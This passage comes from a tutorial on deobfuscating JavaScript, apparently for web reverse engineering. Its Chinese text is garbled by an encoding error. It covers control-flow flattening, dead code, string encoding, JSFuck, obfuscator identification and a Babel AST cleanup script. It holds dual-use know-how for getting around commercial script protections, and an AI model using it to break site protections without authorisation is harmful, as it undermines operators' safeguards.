<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">result</span><span class="p">);</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">result</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// å¹³å¦åŒ–å</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">add</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span><span class="w"> </span><span class="nx">b</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">_0x1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;3|1|0|4|2&#39;</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s1">&#39;|&#39;</span><span class="p">),</span><span class="w"> </span><span class="nx">_0x2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span>
<span class="w">    </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="o">!!</span><span class="p">[])</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">switch</span><span class="w"> </span><span class="p">(</span><span class="nx">_0x1</span><span class="p">[</span><span class="nx">_0x2</span><span class="o">++</span><span class="p">])</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="s1">&#39;0&#39;</span><span class="o">:</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">result</span><span class="p">);</span>
<span class="w">            </span><span class="k">continue</span><span class="p">;</span>
<span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="s1">&#39;1&#39;</span><span class="o">:</span>
<span class="w">            </span><span class="nx">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">b</span><span class="p">;</span>
<span class="w">            </span><span class="k">continue</span><span class="p">;</span>
<span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="s1">&#39;2&#39;</span><span class="o">:</span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="nx">result</span><span class="p">;</span>
<span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="s1">&#39;3&#39;</span><span class="o">:</span>
<span class="w">            </span><span class="kd">var</span><span class="w"> </span><span class="nx">result</span><span class="p">;</span>
<span class="w">            </span><span class="k">continue</span><span class="p">;</span>
<span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="s1">&#39;4&#39;</span><span class="o">:</span>
<span class="w">            </span><span class="c1">// å¯èƒ½æ’å…¥çš„åƒåœ¾ä»£ç </span>
<span class="w">            </span><span class="k">continue</span><span class="p">;</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="k">break</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>
</code></pre>
      </div>

      <p><strong>å¯¹æŠ—æ–¹æ³•</strong>:</p>

      <ul>
        <li><strong>æ‰‹åŠ¨åˆ†æ</strong>ï¼šè®°å½•çŠ¶æ€è½¬ç§»è·¯å¾„ï¼Œæ‰‹åŠ¨é‡ç»„ä»£ç å—</li>
        <li><strong>AST è¿˜åŸ</strong>ï¼šè§£æçŠ¶æ€æœºçš„è·³è½¬é€»è¾‘ï¼Œè‡ªåŠ¨é‡å»ºä»£ç é¡ºåºï¼ˆéœ€è¦é«˜çº§ AST æŠ€å·§ï¼‰</li>
        <li><strong>åŠ¨æ€æ‰§è¡Œ</strong>ï¼šç›´æ¥è°ƒç”¨å‡½æ•°ï¼Œé€šè¿‡è¾“å…¥è¾“å‡ºæ¨æ–­é€»è¾‘</li>
      </ul>

      <hr />

      <h3 id="14-åƒµå°¸ä»£ç æ³¨å…¥-dead-code-injection">1.4 åƒµå°¸ä»£ç æ³¨å…¥ (Dead Code Injection)</h3>

      <p><strong>ç‰¹å¾</strong>:</p>

      <ul>
        <li>æ’å…¥å¤§é‡æ°¸è¿œä¸ä¼šæ‰§è¡Œçš„ä»£ç å—</li>
        <li>ä½¿ç”¨ <code>if (false)</code> æˆ–æ°¸è¿œä¸ºå‡çš„å¤æ‚æ¡ä»¶</li>
      </ul>

      <p><strong>ç¤ºä¾‹</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">encrypt</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">()</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="c1">// è¿™æ®µä»£ç æ°¸è¿œä¸ä¼šæ‰§è¡Œ</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">decrypt</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">md5</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!!</span><span class="p">[]</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="p">[])</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="c1">// åˆæ˜¯æ­»ä»£ç </span>
<span class="w">        </span><span class="nx">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">sha256</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">result</span><span class="p">;</span>
<span class="p">}</span>
</code></pre>
      </div>

      <p><strong>å¯¹æŠ—æ–¹æ³•</strong>:</p>

      <ul>
        <li>ä½¿ç”¨ Babel çš„å¸¸é‡æŠ˜å  (Constant Folding) ä¼˜åŒ–</li>
        <li>æ‰‹åŠ¨è¯†åˆ«å¹¶åˆ é™¤æ˜æ˜¾çš„æ­»ä»£ç åˆ†æ”¯</li>
      </ul>

      <hr />

      <h3 id="15-æ•°å­—å­—ç¬¦ä¸²ç¼–ç -encoding">1.5 æ•°å­—/å­—ç¬¦ä¸²ç¼–ç  (Encoding)</h3>

      <p><strong>ç‰¹å¾</strong>:</p>

      <ul>
        <li>æ•°å­—è¢«ç¼–ç ä¸ºåå…­è¿›åˆ¶ã€å…«è¿›åˆ¶ã€æˆ–è®¡ç®—è¡¨è¾¾å¼</li>
        <li>å­—ç¬¦ä¸²è¢« Base64ã€Unicode è½¬ä¹‰ã€æˆ–è‡ªå®šä¹‰ç¼–ç </li>
      </ul>

      <p><strong>ç¤ºä¾‹</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// åŸå§‹</span>
<span class="kd">var</span><span class="w"> </span><span class="nx">port</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">443</span><span class="p">;</span>
<span class="kd">var</span><span class="w"> </span><span class="nx">msg</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;Hello&quot;</span><span class="p">;</span>

<span class="c1">// æ··æ·†å</span>
<span class="kd">var</span><span class="w"> </span><span class="nx">port</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x1bb</span><span class="p">;</span><span class="w"> </span><span class="c1">// åå…­è¿›åˆ¶</span>
<span class="kd">var</span><span class="w"> </span><span class="nx">port</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mo">0o673</span><span class="p">;</span><span class="w"> </span><span class="c1">// å…«è¿›åˆ¶</span>
<span class="kd">var</span><span class="w"> </span><span class="nx">port</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">500</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mf">57</span><span class="p">;</span><span class="w"> </span><span class="c1">// è®¡ç®—è¡¨è¾¾å¼</span>
<span class="kd">var</span><span class="w"> </span><span class="nx">msg</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">atob</span><span class="p">(</span><span class="s1">&#39;SGVsbG8=&#39;</span><span class="p">);</span><span class="w"> </span><span class="c1">// Base64</span>
<span class="kd">var</span><span class="w"> </span><span class="nx">msg</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;\u0048\u0065\u006c\u006c\u006f&#39;</span><span class="p">;</span><span class="w"> </span><span class="c1">// Unicode</span>
</code></pre>
      </div>

      <p><strong>å¯¹æŠ—æ–¹æ³•</strong>:</p>

      <ul>
        <li>AST å¸¸é‡æŠ˜å è‡ªåŠ¨è®¡ç®—</li>
        <li>åœ¨ Console æ‰‹åŠ¨æ‰§è¡Œç¼–ç å­—ç¬¦ä¸²</li>
      </ul>

      <hr />

      <h3 id="16-ç‰¹æ®Šç¼–ç æ··æ·†-jjencode-aaencode-jsfuck">1.6 ç‰¹æ®Šç¼–ç æ··æ·† (JJEncode / AAEncode / JSFuck)</h3>

      <p><strong>ç‰¹å¾</strong>:</p>

      <ul>
        <li><strong>JJEncode</strong>: å…¨æ˜¯ç¬¦å· <code>$ _ + " â˜ ( ) . !</code></li>
        <li><strong>AAEncode</strong>: ä½¿ç”¨ é¢œæ–‡å­— <code>(ã‚šĞ”ã‚š)</code> ç­‰</li>
        <li><strong>JSFuck</strong>: ä»…ä½¿ç”¨ <code>[]()!+</code> å…­ä¸ªå­—ç¬¦</li>
      </ul>

      <p><strong>ç¤ºä¾‹</strong> (JSFuck):</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// alert(1) çš„ JSFuck ç‰ˆæœ¬</span>
<span class="p">[][(</span><span class="o">!</span><span class="p">[]</span><span class="o">+</span><span class="p">[])[</span><span class="o">+</span><span class="p">[]]</span><span class="o">+</span><span class="p">([</span><span class="o">!</span><span class="p">[]]</span><span class="o">+</span><span class="p">[][[]])[</span><span class="o">+!+</span><span class="p">[]</span><span class="o">+</span><span class="p">[</span><span class="o">+</span><span class="p">[]]]</span><span class="o">+</span><span class="p">(</span><span class="o">!</span><span class="p">[]</span><span class="o">+</span><span class="p">[])[</span><span class="o">!+</span><span class="p">[]</span><span class="o">+!+</span><span class="p">[]]</span><span class="o">+</span><span class="p">...</span>
</code></pre>
      </div>

      <p><strong>å¯¹æŠ—æ–¹æ³•</strong>:</p>

      <ul>
        <li>ç›´æ¥åœ¨ Console æ‰§è¡Œï¼ˆå»æ‰æœ€åçš„ <code>()</code> é¿å…ç«‹å³æ‰§è¡Œï¼‰</li>
        <li>ä½¿ç”¨åœ¨çº¿å·¥å…·: https://enkhee-osiris.github.io/Decoder-JSFuck/</li>
        <li>è¿™äº›ç¼–ç é€šå¸¸åªæ˜¯å¤–å±‚åŒ…è£…ï¼Œè§£ç åè¿˜éœ€è¦è¿›ä¸€æ­¥åæ··æ·†</li>
      </ul>

      <hr />

      <h2 id="2-æ··æ·†å™¨è¯†åˆ«">2. æ··æ·†å™¨è¯†åˆ«</h2>

      <h3 id="21-javascript-obfuscator-æœ€å¸¸è§">2.1 javascript-obfuscator (æœ€å¸¸è§)</h3>

      <p><strong>å®˜ç½‘</strong>: https://obfuscator.io/</p>

      <p><strong>ç‰¹å¾</strong>:</p>

      <ul>
        <li>é¡¶éƒ¨æœ‰ <code>_0x????</code> æ ¼å¼çš„å­—ç¬¦ä¸²æ•°ç»„</li>
        <li>è‡ªæ‰§è¡Œå‡½æ•°è¿›è¡Œæ•°ç»„æ—‹è½¬</li>
        <li>å‡½æ•°åã€å˜é‡åå…¨æ˜¯ <code>_0x????</code> æ ¼å¼</li>
        <li>å¯èƒ½åŒ…å«æ§åˆ¶æµå¹³å¦åŒ–</li>
      </ul>

      <p><strong>é…ç½®ç­‰çº§</strong>:</p>

      <table>
        <thead>
          <tr>
            <th>ç­‰çº§</th>
            <th>ç‰¹å¾</th>
            <th>éš¾åº¦</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td>Low</td>
            <td>ä»…å˜é‡åæ··æ·†</td>
            <td>â­</td>
          </tr>
          <tr>
            <td>Medium</td>
            <td>+ å­—ç¬¦ä¸²æ•°ç»„</td>
            <td>â­â­</td>
          </tr>
          <tr>
            <td>High</td>
            <td>+ æ§åˆ¶æµå¹³å¦åŒ–</td>
            <td>â­â­â­â­</td>
          </tr>
          <tr>
            <td>Extreme</td>
            <td>+ æ­»ä»£ç  + è‡ªæˆ‘é˜²å¾¡</td>
            <td>â­â­â­â­â­</td>
          </tr>
        </tbody>
      </table>

      <p><strong>å¯¹æŠ—å·¥å…·</strong>:</p>

      <ul>
        <li>https://deobfuscate.io/ (é’ˆå¯¹ obfuscator.io)</li>
        <li>AST è‡ªå®šä¹‰è„šæœ¬ï¼ˆè§ <a href="#07-Scripts-deobfuscation-scripts">åæ··æ·†è„šæœ¬</a>ï¼‰</li>
      </ul>

      <hr />

      <h3 id="22-webpackrollup-æ‰“åŒ…">2.2 Webpack/Rollup æ‰“åŒ…</h3>

      <p><strong>ç‰¹å¾</strong>:</p>

      <ul>
        <li>ç«‹å³æ‰§è¡Œå‡½æ•° <code>(function(modules) { ... })([func1, func2, ...])</code></li>
        <li>æ¨¡å—é€šè¿‡ç´¢å¼•è®¿é—®: <code>__webpack_require__(0)</code></li>
        <li>æœ‰æ˜æ˜¾çš„æ¨¡å—åŠ è½½å™¨ä»£ç </li>
      </ul>

      <p><strong>å¯¹æŠ—å·¥å…·</strong>:</p>

      <ul>
        <li><strong>webcrack</strong>: https://github.com/j4k0xb/webcrack<br />
          <div class="codehilite"><br />
            <pre><span></span><code>npm<span class="w"> </span>install<span class="w"> </span>-g<span class="w"> </span>webcrack<br />
webcrack<span class="w"> </span>bundle.js<span class="w"> </span>-o<span class="w"> </span>output/<br />
</code></pre><br />
          </div>
        </li>
      </ul>

      <ul>
        <li><strong>webpack-bundle-analyzer</strong>: åˆ†ææ‰“åŒ…ç»“æ„</li>
      </ul>

      <hr />

      <h3 id="23-å•†ä¸šçº§æ··æ·†-jscrambler-å½¢çŠ¶å®‰å…¨ç­‰">2.3 å•†ä¸šçº§æ··æ·† (Jscrambler, å½¢çŠ¶å®‰å…¨ç­‰)</h3>

      <p><strong>ç‰¹å¾</strong>:</p>

      <ul>
        <li>å¤šå±‚åµŒå¥—æ··æ·†</li>
        <li>è™šæ‹Ÿæœºä¿æŠ¤ (JSVMP)</li>
        <li>åè°ƒè¯•é™·é˜±</li>
        <li>åŸŸåç»‘å®š</li>
      </ul>

      <p><strong>éš¾åº¦</strong>: â­â­â­â­â­</p>

      <p><strong>å¯¹æŠ—æ–¹æ³•</strong>:</p>

      <ul>
        <li>éœ€è¦æ·±å…¥ç†è§£è™šæ‹ŸæœºåŸç†ï¼ˆè§ <a href="#04-Advanced-Recipes-javascript-vm-protection">JavaScript è™šæ‹Ÿæœºä¿æŠ¤</a>ï¼‰</li>
        <li>é€šå¸¸éœ€è¦ RPC è°ƒç”¨æˆ–å®Œæ•´æ‰£ä»£ç </li>
        <li>å•†ä¸šæ··æ·†é€šå¸¸ä¸å»ºè®®å®Œå…¨è¿˜åŸï¼Œç›´æ¥ Hook æˆ– RPC æ›´é«˜æ•ˆ</li>
      </ul>

      <hr />

      <h2 id="3-è‡ªåŠ¨åŒ–åæ··æ·†å·¥å…·">3. è‡ªåŠ¨åŒ–åæ··æ·†å·¥å…·</h2>

      <h3 id="31-åœ¨çº¿å·¥å…·å¯¹æ¯”">3.1 åœ¨çº¿å·¥å…·å¯¹æ¯”</h3>

      <table>
        <thead>
          <tr>
            <th>å·¥å…·</th>
            <th>é“¾æ¥</th>
            <th>æ”¯æŒæ··æ·†ç±»å‹</th>
            <th>ä¼˜ç‚¹</th>
            <th>ç¼ºç‚¹</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>deobfuscate.io</strong></td>
            <td>https://deobfuscate.io/</td>
            <td>obfuscator.io</td>
            <td>ä¸“é—¨é’ˆå¯¹ obfuscator.io</td>
            <td>ä»…æ”¯æŒç‰¹å®šæ··æ·†å™¨</td>
          </tr>
          <tr>
            <td><strong>JSNice</strong></td>
            <td>http://jsnice.org/</td>
            <td>å˜é‡åæ¢å¤</td>
            <td>AI æ¨æµ‹å˜é‡å</td>
            <td>ä¸å¤„ç†å­—ç¬¦ä¸²æ•°ç»„</td>
          </tr>
          <tr>
            <td><strong>Prettier</strong></td>
            <td>https://prettier.io/playground/</td>
            <td>ä»£ç æ ¼å¼åŒ–</td>
            <td>ç¾åŒ–ä»£ç ç»“æ„</td>
            <td>ä¸è§£å¯†å­—ç¬¦ä¸²</td>
          </tr>
          <tr>
            <td><strong>de4js</strong></td>
            <td>https://lelinhtinh.github.io/de4js/</td>
            <td>JJEncode, AAEncode, JSFuck</td>
            <td>æ”¯æŒç‰¹æ®Šç¼–ç </td>
            <td>ä¸æ”¯æŒé€šç”¨æ··æ·†</td>
          </tr>
          <tr>
            <td><strong>Synchrony</strong></td>
            <td>https://deobfuscate.relative.im/</td>
            <td>é€šç”¨æ··æ·†</td>
            <td>è‡ªåŠ¨è¯†åˆ«æ··æ·†ç±»å‹</td>
            <td>å‡†ç¡®ç‡ä¸€èˆ¬</td>
          </tr>
        </tbody>
      </table>

      <hr />

      <h3 id="32-æœ¬åœ°å·¥å…·">3.2 æœ¬åœ°å·¥å…·</h3>

      <h4 id="babel-ast-æ¨è">Babel + AST (æ¨è)</h4>

      <p><strong>å®‰è£…</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code>npm<span class="w"> </span>install<span class="w"> </span>@babel/core<span class="w"> </span>@babel/parser<span class="w"> </span>@babel/traverse<span class="w"> </span>@babel/generator<span class="w"> </span>@babel/types
</code></pre>
      </div>

      <p><strong>åŸºç¡€åæ··æ·†è„šæœ¬</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">parser</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;@babel/parser&#39;</span><span class="p">);</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">traverse</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;@babel/traverse&#39;</span><span class="p">).</span><span class="k">default</span><span class="p">;</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">generator</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;@babel/generator&#39;</span><span class="p">).</span><span class="k">default</span><span class="p">;</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">t</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;@babel/types&#39;</span><span class="p">);</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">fs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;fs&#39;</span><span class="p">);</span>

<span class="c1">// è¯»å–æ··æ·†ä»£ç </span>
<span class="kd">const</span><span class="w"> </span><span class="nx">code</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">fs</span><span class="p">.</span><span class="nx">readFileSync</span><span class="p">(</span><span class="s1">&#39;obfuscated.js&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;utf-8&#39;</span><span class="p">);</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">ast</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">parser</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">code</span><span class="p">);</span>

<span class="c1">// 1. å¸¸é‡æŠ˜å </span>
<span class="nx">traverse</span><span class="p">(</span><span class="nx">ast</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">BinaryExpression</span><span class="p">(</span><span class="nx">path</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">path</span><span class="p">.</span><span class="nx">evaluate</span><span class="p">();</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">result</span><span class="p">.</span><span class="nx">confident</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">path</span><span class="p">.</span><span class="nx">replaceWith</span><span class="p">(</span><span class="nx">t</span><span class="p">.</span><span class="nx">valueToNode</span><span class="p">(</span><span class="nx">result</span><span class="p">.</span><span class="nx">value</span><span class="p">));</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">});</span>

<span class="c1">// 2. å­—ç¬¦ä¸²æ•°ç»„è¿˜åŸï¼ˆéœ€è¦å…ˆæ‰§è¡Œæ•°ç»„åˆå§‹åŒ–ä»£ç ï¼‰</span>
<span class="c1">// å…·ä½“å®ç°è§ 07-Scripts/deobfuscation_scripts.md</span>

<span class="c1">// 3. åˆ é™¤æ­»ä»£ç </span>
<span class="nx">traverse</span><span class="p">(</span><span class="nx">ast</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">IfStatement</span><span class="p">(</span><span class="nx">path</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">test</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">path</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;test&#39;</span><span class="p">).</span><span class="nx">evaluate</span><span class="p">();</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">test</span><span class="p">.</span><span class="nx">confident</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">test</span><span class="p">.</span><span class="nx">value</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="nx">path</span><span class="p">.</span><span class="nx">replaceWithMultiple</span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nx">node</span><span class="p">.</span><span class="nx">consequent</span><span class="p">.</span><span class="nx">body</span><span class="p">);</span>
<span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nx">node</span><span class="p">.</span><span class="nx">alternate</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="nx">path</span><span class="p">.</span><span class="nx">replaceWith</span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nx">node</span><span class="p">.</span><span class="nx">alternate</span><span class="p">);</span>
<span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="nx">path</span><span class="p">.</span><span class="nx">remove</span><span class="p">();</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">});</span>

<span class="c1">// è¾“å‡ºç»“æœ</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">output</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">generator</span><span class="p">(</span><span class="nx">ast</span><span class="p">,</span><span class="w"> </span><span class="p">{},</span><span class="w"> </span><span class="nx">code</span><span class="p">);</span>
<span class="nx">fs</span><span class="p">.</span><span class="nx">writeFileSync</span><span class="p">(</span><span class="s1">&#39;deobfuscated.js&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">output</span><span class="p">.</span><span class="nx">code</span><span class="p">);</span>
</code></pre>
      </div>

      <p>è¯¦ç»†çš„ AST åæ··æ·†è„šæœ¬è§ï¼š<a href="#07-Scripts-deobfuscation-scripts">åæ··æ·†è„šæœ¬</a></p>

      <hr />

      <h4 id="webcrack-webpack-ä¸“ç”¨">webcrack (Webpack ä¸“ç”¨)</h4>

      <div class="codehilite">
        <pre><span></span><code>npm<span class="w"> </span>install<span class="w"> </span>-g<span class="w"> </span>webcrack
webcrack<span class="w"> </span>bundle.js<span class="w"> </span>-o<span class="w"> </span>output/
</code></pre>
      </div>

      <p><strong>åŠŸèƒ½</strong>:</p>

      <ul>
        <li>è‡ªåŠ¨è¯†åˆ« Webpack æ‰“åŒ…</li>
        <li>æå–æ¨¡å—ä»£ç </li>
        <li>è¿˜åŸç›®å½•ç»“æ„</li>
        <li>é‡å‘½åå˜é‡</li>
      </ul>

      <hr />

      <h2 id="4-æ‰‹åŠ¨åæ··æ·†æŠ€å·§">4. æ‰‹åŠ¨åæ··æ·†æŠ€å·§</h2>

      <p>å½“è‡ªåŠ¨åŒ–å·¥å…·å¤±æ•ˆæ—¶ï¼Œæˆ‘ä»¬éœ€è¦"æ‰‹æœ¯åˆ€"å¼ç²¾å‡†æ“ä½œã€‚</p>

      <h3 id="41-chrome-devtools-æŠ€å·§">4.1 Chrome DevTools æŠ€å·§</h3>

      <h4 id="é‡å‘½åç¬¦å·-rename-symbol">é‡å‘½åç¬¦å· (Rename Symbol)</h4>

      <ol>
        <li>åœ¨ Sources é¢æ¿æ‰“å¼€æ··æ·†ä»£ç </li>
        <li>å³é”®å˜é‡å â†’ &#8220;Rename Symbol&#8221;</li>
        <li>è¾“å…¥æœ‰æ„ä¹‰çš„åç§°ï¼ˆå¦‚ <code>token</code>, <code>timestamp</code>ï¼‰</li>
        <li>DevTools ä¼šè‡ªåŠ¨é‡å‘½åè¯¥ä½œç”¨åŸŸå†…çš„æ‰€æœ‰å¼•ç”¨</li>
      </ol>

      <h4 id="æ ¼å¼åŒ–ä»£ç -pretty-print">æ ¼å¼åŒ–ä»£ç  (Pretty Print)</h4>

      <ul>
        <li>ç‚¹å‡»å·¦ä¸‹è§’ <code>{}</code> æŒ‰é’®è‡ªåŠ¨æ ¼å¼åŒ–</li>
        <li>å°†å•è¡Œä»£ç å±•å¼€ä¸ºå¤šè¡Œï¼Œä¾¿äºé˜…è¯»</li>
      </ul>

      <h4 id="æ¡ä»¶æ–­ç‚¹-conditional-breakpoint">æ¡ä»¶æ–­ç‚¹ (Conditional Breakpoint)</h4>

      <ul>
        <li>å³é”®è¡Œå· â†’ &#8220;Add conditional breakpoint&#8221;</li>
        <li>è¾“å…¥æ¡ä»¶ï¼š<code>userId === 12345</code></li>
        <li>åªåœ¨ç‰¹å®šæ¡ä»¶ä¸‹æ–­ç‚¹ï¼Œé¿å…é¢‘ç¹ä¸­æ–­</li>
      </ul>

      <hr />

      <h3 id="42-console-repl-æŠ€å·§">4.2 Console REPL æŠ€å·§</h3>

      <h4 id="æ‰§è¡Œå¹¶æ›¿æ¢">æ‰§è¡Œå¹¶æ›¿æ¢</h4>

      <p>é‡åˆ°å¤æ‚è¡¨è¾¾å¼ï¼Œç›´æ¥åœ¨ Console è®¡ç®—ç»“æœï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// æ··æ·†ä»£ç </span>
<span class="kd">var</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x1bb</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mh">0x2</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mh">0x64</span><span class="p">;</span>

<span class="c1">// Console ä¸­æ‰§è¡Œ</span>
<span class="mh">0x1bb</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mh">0x2</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mh">0x64</span><span class="w">  </span><span class="c1">// è¾“å‡º: 790</span>

<span class="c1">// æ‰‹åŠ¨æ›¿æ¢ä¸º</span>
<span class="kd">var</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">790</span><span class="p">;</span>
</code></pre>
      </div>

      <h4 id="å¯¼å‡ºå¤§æ•°ç»„">å¯¼å‡ºå¤§æ•°ç»„</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// æ··æ·†ä»£ç ä¸­æœ‰å·¨å¤§çš„æ•°ç»„</span>
<span class="kd">var</span><span class="w"> </span><span class="nx">_0xabcd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="cm">/* å‡ åƒä¸ªå…ƒç´  */</span><span class="p">];</span>

<span class="c1">// Console ä¸­</span>
<span class="nx">copy</span><span class="p">(</span><span class="nx">_0xabcd</span><span class="p">)</span><span class="w">  </span><span class="c1">// è‡ªåŠ¨å¤åˆ¶åˆ°å‰ªè´´æ¿</span>
</code></pre>
      </div>

      <h4 id="æå–è§£å¯†å‡½æ•°">æå–è§£å¯†å‡½æ•°</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// æ··æ·†ä»£ç ä¸­çš„è§£å¯†å‡½æ•°</span>
<span class="kd">var</span><span class="w"> </span><span class="nx">_0x5678</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">index</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">_0xabcd</span><span class="p">[</span><span class="nx">index</span><span class="p">];</span>
<span class="p">};</span>

<span class="c1">// åœ¨ Console ä¸­æŒ‚è½½ä¸ºå…¨å±€å‡½æ•°</span>
